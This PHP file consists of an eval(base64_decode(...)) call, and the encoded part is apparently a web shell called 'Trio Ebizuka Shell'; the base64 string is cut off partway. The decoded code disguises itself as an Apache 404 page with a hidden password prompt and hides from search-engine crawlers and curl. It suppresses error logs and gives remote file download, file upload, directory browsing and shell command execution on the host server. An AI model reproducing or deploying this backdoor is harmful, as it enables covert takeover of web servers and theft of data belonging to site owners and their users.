<?php eval("?>".base64_decode("PD9waHAgc2Vzc2lvbl9zdGFydCgpOwovLyoqKiogc2hlbGwgYnlwYXMgc2VydmVyIGFsYSBwYWxhIGJhcGFrIGthdSB2ZXJzaSB0cmlvIGViaXp1a2EgCi8vIFBST0RVQ1QgQlkgREsgUkVDT0RFIE1VSEVIRUhFSAoKZnVuY3Rpb24gZ2VuZXJhdGVSYW5kb21TdHJpbmcoJGxlbmd0aCA9IDEwKSB7CiAgICAkY2hhcmFjdGVycyA9ICcwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWic7CiAgICAkY2hhcmFjdGVyc0xlbmd0aCA9IHN0cmxlbigkY2hhcmFjdGVycyk7CiAgICAkcmFuZG9tU3RyaW5nID0gJyc7CiAgICBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyAkaSsrKSB7CiAgICAgICAgJHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1tyYW5kKDAsICRjaGFyYWN0ZXJzTGVuZ3RoIC0gMSldOwogICAgfQogICAgcmV0dXJuICRyYW5kb21TdHJpbmc7Cn0KCmZ1bmN0aW9uIHByaW50TG9naW54KCkgeyAgCiBlY2hvICc8IURPQ1RZUEUgaHRtbD48aHRtbD48aGVhZD48bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQibm9pbmRleC4gbm9mb2xsb3ciPjx0aXRsZT48L3RpdGxlPjwvaGVhZD48Ym9keT4KIDxoMT5Ob3QgRm91bmQ8L2gxPiAKICAgICA8dGl0bGU+NDA0IE5vdCBGb3VuZDwvdGl0bGU+CiA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgogaW5wdXRbdHlwZT1wYXNzd29yZF0gewogICAgIHdpZHRoOiAyNTBweDsKICAgICBoZWlnaHQ6IDI1cHg7CiAgICAgY29sb3I6IHdoaXRlOwogICAgIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OwogICAgIGJvcmRlcjogMXB4IHNvbGlkIHdoaXRlOwogICAgIG1hcmdpbi1sZWZ0OiAyMHB4OwogICAgIHRleHQtYWxpZ246IGNlbnRlcjsKIH0KIDwvc3R5bGU+CiAgICAgPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IAogPHA+QWRkaXRpb25hbGx5LCBhIDQwNCBOb3QgRm91bmQgZXJyb3Igd2FzIGVuY291bnRlcmVkIHdoaWxlIHRyeWluZyB0byB1c2UgYW4gRXJyb3JEb2N1bWVudCB0byBoYW5kbGUgdGhlIHJlcXVlc3QuPC9wPiAKIDxocj4gCiA8YWRkcmVzcz5BcGFjaGUgU2VydmVyIGF0ICcuJF9TRVJWRVJbIkhUVFBfSE9TVCJdLicgUG9ydCAnLiRfU0VSVkVSWyJTRVJWRVJfUE9SVCJdLic8L2FkZHJlc3M+IAoKIDxjZW50ZXI+PGZvcm0gbWV0aG9kPSJwb3N0Ij48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9IicuJF9TRVNTSU9OWyJrZXl4eCJdLiciIGF1dG9jb21wbGV0ZT0ib2ZmIj48YnI+PC9mb3JtPjwvY2VudGVyPjwvYm9keT48L2h0bWw+CiAgICAnOyAgIAogICAgZXhpdDsgCn0gCgokYXV0aF9wYXNzNSA9ICIxYjFjZWNhZWJkODI1ZGRlNzYxMDNlYTc3MjJjMzBhZTNmZmZiMjA2IjsgCmlmKGVtcHR5KCRfU0VTU0lPTlsia2V5eHgiXSkpIHsKICAgJGtleXh4eCA9IGdlbmVyYXRlUmFuZG9tU3RyaW5nKCk7CiAgICRfU0VTU0lPTlsia2V5eHgiXSA9ICRrZXl4eHg7CiAgIAp9Cgoka2V5eHggPSRfU0VTU0lPTlsia2V5eHgiXTsKCgoKaWYoIGVtcHR5KCAkX1NFU1NJT05bbWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSldICkpIHsKICAgIGlmKCBpc3NldCgkX1BPU1RbJGtleXh4XSkgQU5EIHNoYTEobWQ1KCRfUE9TVFska2V5eHhdKSkgPT0gJGF1dGhfcGFzczUgKQogICAgICAgICRfU0VTU0lPTlttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKV0gPSB0cnVlOyAKICAgIGVsc2UgCiAgICAgICAgcHJpbnRMb2dpbngoKTsKICAgICBleGl0KCk7Cgp9CmVycm9yX3JlcG9ydGluZygwKTsKc2V0X3RpbWVfbGltaXQoMCk7CkBjbGVhcnN0YXRjYWNoZSgpOwpAaW5pX3NldCgnZXJyb3JfbG9nJyxOVUxMKTsKQGluaV9zZXQoJ2xvZ19lcnJvcnMnLDApOwpAaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywwKTsKQGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLDApOwpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsKaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzcnLCAnPCcpKSB7CiAgICBAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOwp9CgokU0VSVkVSSVAgID0gKCEkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgPyBnZXRob3N0YnluYW1lKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkgOiAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTsKCiRGSUxFUEFUSCAgPSBzdHJfcmVwbGFjZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLCAiIiwgcGF0aCgpKTsKaWYoIWVtcHR5KCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpIHsKICAgICR1c2VyQWdlbnRzID0gYXJyYXkoIkdvb2dsZWJvdCIsICJTbHVycCIsICJNU05Cb3QiLCAiUHljVVJMIiwgImZhY2Vib29rZXh0ZXJuYWxoaXQiLCAiaWFfYXJjaGl2ZXIiLCAiY3Jhd2xlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJZYWhvbyEgU2x1cnAiLCAiWWFob29TZWVrZXIiLCAiYmluZ2JvdCIsICJjdXJsIik7CiAgICBpZihwcmVnX21hdGNoKCcvJyAuIGltcGxvZGUoJ3wnLCAkdXNlckFnZW50cykgLiAnL2knLCAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKSB7CiAgICAgICAgaGVhZGVyKCdIVFRQLzEuMCA0MDQgTm90IEZvdW5kJyk7CiAgICAgICAgZXhpdDsKICAgIH0KfQoKaWYoaXNzZXQoJF9HRVRbJ2ZpbGUnXSkgJiYgKCRfR0VUWydmaWxlJ10gIT0gJycpICYmICgkX0dFVFsnYWN0J10gPT0gJ2Rvd25sb2FkJykpIHsKICAgIC8vQG9iX2NsZWFuKCk7CiAgICAkZmlsZSA9ICRfR0VUWydmaWxlJ107CiAgICBpZihmaWxlX2V4aXN0cygkZmlsZSkpIHsKICAgICAgaGVhZGVyKCdDb250ZW50LURlc2NyaXB0aW9uOiBGaWxlIFRyYW5zZmVyJyk7CiAgICAgIGhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKTsKICAgICAgaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0nLmJhc2VuYW1lKCRmaWxlKSk7CiAgICAgIGhlYWRlcignQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5Jyk7CiAgICAgIGhlYWRlcignRXhwaXJlczogMCcpOwogICAgICBoZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCcpOwogICAgICBoZWFkZXIoJ1ByYWdtYTogcHVibGljJyk7CiAgICAgIGhlYWRlcignQ29udGVudC1MZW5ndGg6ICcgLiBmaWxlc2l6ZSgkZmlsZSkpOwogICAgICBvYl9jbGVhbigpOwogICAgICBmbHVzaCgpOwogICAgICByZWFkZmlsZSgkZmlsZSk7CiAgICAgIGV4aXQ7CiAgICB9ZWxzZSB7CiAgICAgICAgICBkaWUoJ1RoZSBwcm92aWRlZCBmaWxlIHBhdGggaXMgbm90IHZhbGlkLicpOwogICAgfQp9CgppZigkX1BPU1RbJ3VwbG9hZCddKXsKICBpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sIHBhdGgoKS5ESVJFQ1RPUllfU0VQQVJBVE9SLiRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddLiIiKSkgewoJCSRhY3QgPSBjb2xvcigxLCAyLCAiVXBsb2FkZWQhIikuIiBhdCA8aT48Yj4iLnBhdGgoKS5ESVJFQ1RPUllfU0VQQVJBVE9SLiRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddLiI8L2I+PC9pPiI7Cgl9CgllbHNlIHsKCQkkYWN0ID0gY29sb3IoMSwgMSwgIkZhaWxlZCB0byB1cGxvYWQgZmlsZSEiKTsKCX0KfQoKPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5UcmlvIEViaXp1a2EgVi4yPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvbWF0ZXJpYWxpemUvMC45OS4wL2Nzcy9tYXRlcmlhbGl6ZS5taW4uY3NzIj4KICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vaWNvbj9mYW1pbHk9TWF0ZXJpYWwrSWNvbnMiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgPHN0eWxlPgogICAgICAjY29udGVudHsKICAgICAgICBtYXJnaW46IDIwcHg7CiAgICAgIH0KCiAgICAgIHRleHRhcmVhewogICAgICAgIG92ZXJmbG93LXk6IHNjcm9sbDsKICAgICAgICBoZWlnaHQ6IDMwMHB4OwogICAgICB9CgogICAgPC9zdHlsZT4KCiAgPC9oZWFkPgogIDxib2R5IGNsYXNzPSJncmV5IGxpZ2h0ZW4tMiI+CiAgICA8dWwgaWQ9ImRyb3Bkb3duMSIgY2xhc3M9ImRyb3Bkb3duLWNvbnRlbnQiPgogICAgICA8bGk+PGEgaHJlZj0iP2FjdD1jbWQmIzM4O2Rpcj08P3BocCBwcmludCBwYXRoKGxzIC1hbCk7ID8+Ij5SZXZlcnNlPC9hPjwvbGk+CiAgICAgIDxsaT48YSBocmVmPSIjISI+S29zb25nPC9hPjwvbGk+CiAgICAgIDxsaT48YSBocmVmPSIjISI+S29zb25nPC9hPjwvbGk+CiAgICA8L3VsPgogICAgPG5hdj4KICAgICAgPGRpdiBjbGFzcz0ibmF2LXdyYXBwZXIgdGVhbCBkYXJrZW4tMyI+CiAgICAgICAgPGEgaHJlZj0iIyIgY2xhc3M9ImJyYW5kLWxvZ28iPlRyaW8gRWJpenVrYSBTaGVsbDwvYT4KICAgICAgICA8dWwgaWQ9Im5hdi1tb2JpbGUiIGNsYXNzPSJyaWdodCBoaWRlLW9uLW1lZC1hbmQtZG93biI+CiAgICAgICAgICA8bGk+PGEgaHJlZj0iPyI+SG9tZTwvYT48L2xpPgogICAgICAgICAgPGxpPjxhIGhyZWY9Ij9hY3Q9Y21kJiMzODtkaXI9PD9waHAgcHJpbnQgcGF0aCgpOyA/PiI+Q21kPC9hPjwvbGk+CiAgICAgICAgICA8bGk+CiAgICAgICAgICAgIDxhIGNsYXNzPSJkcm9wZG93bi1idXR0b24iIGhyZWY9IiMhIiBkYXRhLWFjdGl2YXRlcz0iZHJvcGRvd24xIj5Ub29sczxpIGNsYXNzPSJtYXRlcmlhbC1pY29ucyByaWdodCI+YXJyb3dfZHJvcF9kb3duPC9pPjwvYT4KICAgICAgICAgIDwvbGk+CiAgICAgICAgPC91bD4KICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICA8ZGl2IGNsYXNzPSJjb2wgczEyIj4KICAgICAgICAgIDxkaXYgaWQ9ImNvbnRlbnQiIGNsYXNzPSJjYXJkIHdoaXRlIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1jb250ZW50IGJsYWNrLXRleHQiPgogICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJjYXJkLXRpdGxlIj48Yj5TZXJ2ZXIgSW5mbzwvYj48L3NwYW4+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbCBzNiI+CiAgICAgICAgICAgICAgICAgIDw/cGhwIHNlcnZlcmluZm8xKCk7ID8+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbCBzNiI+CiAgICAgICAgICAgICAgICAgIDw/cGhwIHNlcnZlcmluZm8yKCk7ID8+CgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICA8Zm9ybSBjbGFzcz0iIiBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sIHM2Ij4KICAgICAgICAgICAgICAgICAgICA8cD48Yj5VcGxvYWQgRmlsZTo8L2I+PC9wPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZpbGUtZmllbGQgaW5wdXQtZmllbGQiPgogICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYnRuIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4+RmlsZTwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPgogICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmaWxlLXBhdGgtd3JhcHBlciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZmlsZS1wYXRoIHZhbGlkYXRlIiB0eXBlPSJ0ZXh0Ij4KICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmKCRfUE9TVFsndXBsb2FkJ10pIGVjaG8gJGFjdDsgPz4KICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbCBzNiI+CiAgICAgICAgICAgICAgICAgICAgPHA+PGI+T3B0aW9uczo8L2I+PC9wPjxicj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJ1cGxvYWQiIHZhbHVlPSJVcGxvYWQiIGNsYXNzPSJ3YXZlcy1lZmZlY3Qgd2F2ZXMtbGlnaHQgYnRuIj4gOjo6CiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iP2FjdD1uZXdmaWxlPD9waHAgaWYoaXNzZXQoJF9HRVRbJ2RpciddKSkgcHJpbnQgJyYjMzhkaXI9JyAuIHBhdGgoKTsgPz4iIGNsYXNzPSJ3YXZlcy1lZmZlY3Qgd2F2ZXMtbGlnaHQgYnRuIj5OZXcgRmlsZTwvYT4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/YWN0PW5ld2ZvbGRlcjw/cGhwIGlmKGlzc2V0KCRfR0VUWydkaXInXSkpIHByaW50ICcmIzM4ZGlyPScgLiBwYXRoKCk7ID8+IiBjbGFzcz0id2F2ZXMtZWZmZWN0IHdhdmVzLWxpZ2h0IGJ0biI+TmV3IEZvbGRlcjwvYT4KICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgIDwvZGl2Pjxocj4KICAgICAgICAgICAgPD9waHAgY29udGVudCgpOyA/PgogICAgICAgICAgICA8aHI+CiAgICAgICAgICAgIDxwPlRyaW8gRWJpenVrYSBTaGVsbDwvcD4KICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuMi4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL21hdGVyaWFsaXplLzAuOTkuMC9qcy9tYXRlcmlhbGl6ZS5taW4uanMiPjwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPgoKPD9waHAKCmZ1bmN0aW9uIHNlcnZlcmluZm8xKCkgewogICRvdXRwdXRbXSA9ICJTZXJ2ZXIgSVAgIi5jb2xvcigxLCAyLCAkR0xPQkFMU1snU0VSVkVSSVAnXSkuIiAvIFlvdXIgSVAgIi5jb2xvcigxLCAyLCAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSk7CiAgJG91dHB1dFtdID0gIldlYiBTZXJ2ZXIgIDogIi5jb2xvcigxLCAyLCAkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10pOwogICRvdXRwdXRbXSA9ICJTeXN0ZW0gICAgICA6ICIuY29sb3IoMSwgMiwgcGhwX3VuYW1lKCkpOwogICRvdXRwdXRbXSA9ICJVc2VyIC8gR3JvdXA6ICIuY29sb3IoMSwgMiwgdXNlcmdyb3VwKCktPm5hbWUpLiIoIi5jb2xvcigxLCAyICwgdXNlcmdyb3VwKCktPnVpZCkuIikgLyAiLmNvbG9yKDEsIDIgLCB1c2VyZ3JvdXAoKS0+Z3JvdXApLiIoIi5jb2xvcigxLCAyICwgdXNlcmdyb3VwKCktPmdpZCkuIikiOwoJJG91dHB1dFtdID0gIkhERCAgICAgICAgIDogIi5jb2xvcigxLCAyLCBoZGQoKS0+dXNlZCkuIiAvICIuY29sb3IoMSwgMiAsIGhkZCgpLT5zaXplKS4iIChGcmVlOiAiLmNvbG9yKDEsIDIgLCBoZGQoKS0+ZnJlZSkuIikiOwogICRvdXRwdXRbXSA9ICJQSFAgVmVyIDogIi5jb2xvcigxLCAyLCBAcGhwdmVyc2lvbigpKTsKCiAgcHJpbnQgaW1wbG9kZSgiPGJyPiIsICRvdXRwdXQpOwp9CgpmdW5jdGlvbiBzZXJ2ZXJpbmZvMigpewogICRkaXNhYmxlX2Z1bmN0aW9ucyA9IEBpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpOwogICRkaXNhYmxlX2Z1bmN0aW9ucyA9ICghZW1wdHkoJGRpc2FibGVfZnVuY3Rpb25zKSkgPyBjb2xvcigxLCAxLCAkZGlzYWJsZV9mdW5jdGlvbnMpIDogY29sb3IoMSwgMiwgIk5PTkUiKTsKICAkb3V0cHV0W10gPSAiU2FmZSBNb2RlICAgOiAiLihAaW5pX2dldChzdHJ0b3VwcGVyKCJzYWZlX21vZGUiKSkgPT09ICJPTiIgPyBjb2xvcigxLCAyLCAiT04iKSA6IGNvbG9yKDEsIDIsICJPRkYiKSk7CiAgJG91dHB1dFtdID0gIkRpc2FibGUgRnVuYzogJGRpc2FibGVfZnVuY3Rpb25zIjsKICAkb3V0cHV0W10gPSBsaWJfaW5zdGFsbGVkKCk7CiAgJG91dHB1dFtdID0gIkN1cnJlbnQgRGlyOiAoIi53cml0ZWFibGUocGF0aCgpLCBwZXJtcyhwYXRoKCkpKS4iKSAiOwogIHByaW50IGltcGxvZGUoIjxicj4iLCAkb3V0cHV0KTsKICBwd2QoKTsKfQoKZnVuY3Rpb24gY29sb3IoJGJvbGQgPSAxLCAkY29sb3JpZCA9IG51bGwsICRzdHJpbmcgPSBudWxsKSB7CiAgICAkY29sb3IgPSBhcnJheSgKICAgICAgIjwvc3Bhbj4iLCAgCQkJIyAwIG9mZgogICAgICAiPHNwYW4gY2xhc3M9J3JlZC10ZXh0Jz4iLAkjIDEgcmVkCiAgICAgICI8c3BhbiBjbGFzcz0nZ3JlZW4tdGV4dCc+IiwJIyAyIGxpbWUKICAgICAgIjxzcGFuIGNsYXNzPSd3aGl0ZS10ZXh0Jz4iLAkjIDMgd2hpdGUKICAgICAgIjxzcGFuIGNsYXNzPSdnb2xkLXRleHQnPiIsCSMgNCBnb2xkCiAgICApOwogIHJldHVybiAoJHN0cmluZyAhPT0gbnVsbCkgPyAkY29sb3JbJGNvbG9yaWRdLiRzdHJpbmcuJGNvbG9yWzBdOiAkY29sb3JbMF07Cn0KCmZ1bmN0aW9uIHVzZXJncm91cCgpIHsKCWlmKCFmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSkgewoJCSR1c2VyWyduYW1lJ10gCT0gQGdldF9jdXJyZW50X3VzZXIoKTsKCQkkdXNlclsndWlkJ10gIAk9IEBnZXRteXVpZCgpOwoJCSR1c2VyWydnaWQnXSAgCT0gQGdldG15Z2lkKCk7CgkJJHVzZXJbJ2dyb3VwJ10JPSAiPyI7Cgl9IGVsc2UgewoJCSR1c2VyWyd1aWQnXSAJPSBAcG9zaXhfZ2V0cHd1aWQocG9zaXhfZ2V0ZXVpZCgpKTsKCQkkdXNlclsnZ2lkJ10gCT0gQHBvc2l4X2dldGdyZ2lkKHBvc2l4X2dldGVnaWQoKSk7CgkJJHVzZXJbJ25hbWUnXSAJPSAkdXNlclsndWlkJ11bJ25hbWUnXTsKCQkkdXNlclsndWlkJ10gCT0gJHVzZXJbJ3VpZCddWyd1aWQnXTsKCQkkdXNlclsnZ3JvdXAnXSAJPSAkdXNlclsnZ2lkJ11bJ25hbWUnXTsKCQkkdXNlclsnZ2lkJ10gCT0gJHVzZXJbJ2dpZCddWydnaWQnXTsKCX0KCXJldHVybiAob2JqZWN0KSAkdXNlcjsKfQoKZnVuY3Rpb24gcGVybXMoJHBhdGgpIHsKCSRwZXJtcyA9IGZpbGVwZXJtcygkcGF0aCk7CglpZiAoKCRwZXJtcyAmIDB4QzAwMCkgPT0gMHhDMDAwKSB7CgkJLy8gU29ja2V0CgkJJGluZm8gPSAncyc7Cgl9CgllbHNlaWYgKCgkcGVybXMgJiAweEEwMDApID09IDB4QTAwMCkgewoJCS8vIFN5bWJvbGljIExpbmsKCQkkaW5mbyA9ICdsJzsKCX0KCWVsc2VpZiAoKCRwZXJtcyAmIDB4ODAwMCkgPT0gMHg4MDAwKSB7CgkJLy8gUmVndWxhcgoJCSRpbmZvID0gJy0nOwoJfQoJZWxzZWlmICgoJHBlcm1zICYgMHg2MDAwKSA9PSAweDYwMDApIHsKCQkvLyBCbG9jayBzcGVjaWFsCgkJJGluZm8gPSAnYic7Cgl9CgllbHNlaWYgKCgkcGVybXMgJiAweDQwMDApID09IDB4NDAwMCkgewoJCS8vIERpcmVjdG9yeQoJCSRpbmZvID0gJ2QnOwoJfQoJZWxzZWlmICgoJHBlcm1zICYgMHgyMDAwKSA9PSAweDIwMDApIHsKCQkvLyBDaGFyYWN0ZXIgc3BlY2lhbAoJCSRpbmZvID0gJ2MnOwoJfQoJZWxzZWlmICgoJHBlcm1zICYgMHgxMDAwKSA9PSAweDEwMDApIHsKCQkvLyBGSUZPIHBpcGUKCQkkaW5mbyA9ICdwJzsKCX0KCWVsc2UgewoJCS8vIFVua25vd24KCQkkaW5mbyA9ICd1JzsKCX0KCQkvLyBPd25lcgoJJGluZm8gLj0gKCgkcGVybXMgJiAweDAxMDApID8gJ3InIDogJy0nKTsKCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDgwKSA/ICd3JyA6ICctJyk7CgkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDA0MCkgPwoJKCgkcGVybXMgJiAweDA4MDApID8gJ3MnIDogJ3gnICkgOgoJKCgkcGVybXMgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7CgkvLyBHcm91cAoJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMjApID8gJ3InIDogJy0nKTsKCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDEwKSA/ICd3JyA6ICctJyk7CgkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwOCkgPwoJKCgkcGVybXMgJiAweDA0MDApID8gJ3MnIDogJ3gnICkgOgoJKCgkcGVybXMgJiAweDA0MDApID8gJ1MnIDogJy0nKSk7CgkvLyBXb3JsZAoJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDQpID8gJ3InIDogJy0nKTsKCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDAyKSA/ICd3JyA6ICctJyk7CgkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwMSkgPwoJKCgkcGVybXMgJiAweDAyMDApID8gJ3QnIDogJ3gnICkgOgoJKCgkcGVybXMgJiAweDAyMDApID8gJ1QnIDogJy0nKSk7CglyZXR1cm4gJGluZm87Cn0KCmZ1bmN0aW9uIGV4ZSgkY21kKSB7CglpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKSB7CgkJQG9iX3N0YXJ0KCk7CgkJQHN5c3RlbSgkY21kKTsKCQkkYnVmZiA9IEBvYl9nZXRfY29udGVudHMoKTsKCQlAb2JfZW5kX2NsZWFuKCk7CgkJcmV0dXJuICRidWZmOwoJfSBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpIHsKCQlAZXhlYygkY21kLCRyZXN1bHRzKTsKCQkkYnVmZiA9ICIiOwoJCWZvcmVhY2goJHJlc3VsdHMgYXMgJHJlc3VsdCkgewoJCQkkYnVmZiAuPSAkcmVzdWx0OwoJCX0gcmV0dXJuICRidWZmOwoJfSBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKSB7CgkJQG9iX3N0YXJ0KCk7CgkJQHBhc3N0aHJ1KCRjbWQpOwoJCSRidWZmID0gQG9iX2dldF9jb250ZW50cygpOwoJCUBvYl9lbmRfY2xlYW4oKTsKCQlyZXR1cm4gJGJ1ZmY7Cgl9IGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSkgewoJCSRidWZmID0gQHNoZWxsX2V4ZWMoJGNtZCk7CgkJcmV0dXJuICRidWZmOwoJfQp9CgpmdW5jdGlvbiBsaWJfaW5zdGFsbGVkKCkgewoJJGxpYltdID0gIk15U1FMOiAiLihmdW5jdGlvbl9leGlzdHMoJ215c3FsX2Nvbm5lY3QnKSA/IGNvbG9yKDEsIDIsICJPTiIpIDogY29sb3IoMSwgMSwgIk9GRiIpKTsKCSRsaWJbXSA9ICJjVVJMOiAiLihmdW5jdGlvbl9leGlzdHMoJ2N1cmxfdmVyc2lvbicpID8gY29sb3IoMSwgMiwgIk9OIikgOiBjb2xvcigxLCAxLCAiT0ZGIikpOwoJJGxpYltdID0gIldHRVQ6ICIuKGV4ZSgnd2dldCAtLWhlbHAnKSA/IGNvbG9yKDEsIDIsICJPTiIpIDogY29sb3IoMSwgMSwgIk9GRiIpKTsKCSRsaWJbXSA9ICJQZXJsOiAiLihleGUoJ3BlcmwgLS1oZWxwJykgPyBjb2xvcigxLCAyLCAiT04iKSA6IGNvbG9yKDEsIDEsICJPRkYiKSk7CgkkbGliW10gPSAiUHl0aG9uOiAiLihleGUoJ3B5dGhvbiAtLWhlbHAnKSA/IGNvbG9yKDEsIDIsICJPTiIpIDogY29sb3IoMSwgMSwgIk9GRiIpKTsKCXJldHVybiBpbXBsb2RlKCIgfCAiLCAkbGliKTsKfQoKZnVuY3Rpb24gT1MoKSB7CglyZXR1cm4gKHN1YnN0cihzdHJ0b3VwcGVyKFBIUF9PUyksIDAsIDMpID09PSAiV0lOIikgPyAiV2luZG93cyIgOiAiTGludXgiOwp9CgpmdW5jdGlvbiBwYXRoKCkgewoJaWYoaXNzZXQoJF9HRVRbJ2RpciddKSkgewoJCSRkaXIgPSBzdHJfcmVwbGFjZSgiXFwiLCAiLyIsICRfR0VUWydkaXInXSk7CgkJQGNoZGlyKCRkaXIpOwoJfSBlbHNlIHsKCQkkZGlyID0gc3RyX3JlcGxhY2UoIlxcIiwgIi8iLCBnZXRjd2QoKSk7Cgl9CglyZXR1cm4gJGRpcjsKfQoKZnVuY3Rpb24gZGlzaygpewogICRkaXIgPSBleHBsb2RlKCIvIiwgcGF0aCgpKTsKICByZXR1cm4gJGRpclswXTsKfQoKZnVuY3Rpb24gcHdkKCkgewoJJGRpciA9IGV4cGxvZGUoIi8iLCBwYXRoKCkpOwoJZm9yZWFjaCgkZGlyIGFzICRrZXkgPT4gJGluZGV4KSB7CgkJcHJpbnQgIjxhIGhyZWY9Jz9kaXI9IjsKCQlmb3IoJGkgPSAwOyAkaSA8PSAka2V5OyAkaSsrKSB7CgkJCXByaW50ICRkaXJbJGldOwoJCQlpZigkaSAhPSAka2V5KSB7CgkJCXByaW50ICIvIjsKCQkJfQoJCX0KCQlwcmludCAiJz4kaW5kZXg8L2E+LyI7Cgl9CglwcmludCAiPGJyPiI7CglwcmludCAoT1MoKSA9PT0gIldpbmRvd3MiKSA/IHdpbmRpc2soKSA6ICIiOwp9CgpmdW5jdGlvbiB3aW5kaXNrKCkgewoJ